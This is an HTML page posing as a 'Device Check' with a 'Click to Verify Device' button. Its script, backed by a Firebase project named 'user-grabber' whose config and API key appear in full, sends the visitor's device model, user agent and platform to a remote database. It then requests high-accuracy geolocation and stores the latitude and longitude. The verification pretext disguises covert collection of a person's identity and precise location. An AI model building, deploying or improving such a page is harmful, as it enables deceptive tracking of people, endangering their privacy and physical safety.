<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Check</title>
</head>
<body>

    <!-- Simple button to simulate the "Mobile tap" -->
    <button id="captureBtn" style="padding: 20px; font-size: 20px; margin-top: 50px;">
        Click to Verify Device
    </button>
    
    <p id="statusMsg">Status: Ready</p>

    <script type="module">
        // 1. FIXED: Using a valid Firebase version (10.7.1)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
            authDomain: "user-grabber.firebaseapp.com",
            projectId: "user-grabber",
            databaseURL: "https://user-grabber-default-rtdb.firebaseio.com", 
            storageBucket: "user-grabber.firebasestorage.app",
            messagingSenderId: "1004415300770",
            appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Make function global so HTML can use it
        window.triggerCapture = async function() {
            document.getElementById("statusMsg").innerText = "Processing...";
            console.log("Mobile tap detected...");
            
            const ua = navigator.userAgent;
            let model = "Unknown Mobile";
            
            // Simple model detection
            if (ua.indexOf("iPhone") > -1) model = "iPhone";
            else if (ua.indexOf("Android") > -1) {
                const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)/);
                model = match ? match[2] : "Android Device";
            }

            try {
                // Create a reference
                const logRef = push(ref(db, 'mobile_users'));
                
                const basicData = {
                    device: model,
                    userAgent: ua,
                    platform: navigator.platform || "unknown",
                    time: new Date().toLocaleString(),
                    status: "Waiting for location..."
                };

                // 2. FIXED: Catch errors during the first write
                await set(logRef, basicData);
                console.log("Basic data sent via Firebase");

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            // Success: Update entry with location
                            await set(logRef, {
                                ...basicData,
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                status: "Success"
                            });
                            document.getElementById("statusMsg").innerText = "Success! Location captured.";
                            finishFlow();
                        },
                        async (err) => {
                            // Error: Update entry with error message
                            console.warn("Location error:", err.message);
                            await set(logRef, {
                                ...basicData,
                                status: "Location Denied: " + err.message
                            });
                            document.getElementById("statusMsg").innerText = "Saved (No Location).";
                            finishFlow();
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    document.getElementById("statusMsg").innerText = "Geolocation not supported.";
                    finishFlow();
                }

            } catch (error) {
                console.error("Firebase Write Error:", error);
                alert("Database Error: " + error.message);
            }
        };

        function finishFlow() {
            // Optional: Redirect or cleanup
            console.log("Flow finished.");
        }

        // Attach event listener automatically
        document.getElementById("captureBtn").addEventListener("click", window.triggerCapture);
    </script>
</body>
</html>
